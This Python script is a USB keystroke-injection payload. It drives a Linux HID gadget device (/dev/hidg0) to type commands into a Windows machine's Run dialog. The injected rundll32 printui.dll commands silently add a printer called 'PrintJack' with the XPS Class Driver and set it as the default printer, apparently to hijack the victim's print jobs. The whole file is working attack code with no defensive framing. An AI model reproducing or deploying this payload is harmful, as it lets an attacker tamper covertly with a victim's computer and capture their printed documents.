#!/usr/bin/env python3
import time
import struct

def send_keystroke(hid_device, modifier, key):
    with open(hid_device, 'wb') as f:
        report = struct.pack('8B', modifier, 0, key, 0, 0, 0, 0, 0)
        f.write(report)
        f.flush()
        time.sleep(0.01)
        report = struct.pack('8B', 0, 0, 0, 0, 0, 0, 0, 0)
        f.write(report)
        f.flush()
        time.sleep(0.01)

def send_string(hid_device, text):
    key_map = {
        'a': 0x04, 'b': 0x05, 'c': 0x06, 'd': 0x07, 'e': 0x08, 'f': 0x09,
        'g': 0x0a, 'h': 0x0b, 'i': 0x0c, 'j': 0x0d, 'k': 0x0e, 'l': 0x0f,
        'm': 0x10, 'n': 0x11, 'o': 0x12, 'p': 0x13, 'q': 0x14, 'r': 0x15,
        's': 0x16, 't': 0x17, 'u': 0x18, 'v': 0x19, 'w': 0x1a, 'x': 0x1b,
        'y': 0x1c, 'z': 0x1d, '0': 0x27, '1': 0x1e, '2': 0x1f, '3': 0x20,
        '4': 0x21, '5': 0x22, '6': 0x23, '7': 0x24, '8': 0x25, '9': 0x26,
        ' ': 0x2c, '.': 0x37, ',': 0x36, '/': 0x38, '\\': 0x31, '-': 0x2d,
        '"': 0x34, '%': 0x22  # % uses same key as 5 but with shift
    }
    
    for char in text:
        char_lower = char.lower()
        if char_lower in key_map:
            modifier = 0
            # Handle uppercase letters and special characters that need shift
            if char.isupper():
                modifier = 0x02  # Shift modifier for uppercase
            elif char in '"%':  # Characters that need shift modifier
                modifier = 0x02  # Shift for quote and percent
            
            send_keystroke(hid_device, modifier, key_map[char_lower])
            time.sleep(0.02)

def main():
    hid_dev = "/dev/hidg0"
    time.sleep(2)
    
    print("Opening Run dialog...")
    send_keystroke(hid_dev, 0x08, 0x15)  # Win+R
    time.sleep(0.8)
    
    print("Adding printer with Microsoft XPS Class Driver...")
    # Use Microsoft XPS Class Driver
    cmd = 'rundll32 printui.dll,PrintUIEntry /if /b "PrintJack" /f "%windir%\\inf\\ntprint.inf" /r "USB001" /m "Microsoft XPS Class Driver"'
    send_string(hid_dev, cmd)
    send_keystroke(hid_dev, 0, 0x28)  # Enter
    time.sleep(3)
    
    print("Setting as default printer...")
    send_keystroke(hid_dev, 0x08, 0x15)  # Win+R
    time.sleep(0.8)
    
    default_cmd = 'rundll32 printui.dll,PrintUIEntry /y /n "PrintJack"'
    send_string(hid_dev, default_cmd)
    send_keystroke(hid_dev, 0, 0x28)  # Enter
    time.sleep(1)
    
    print("Installation complete!")

if __name__ == "__main__":
    main()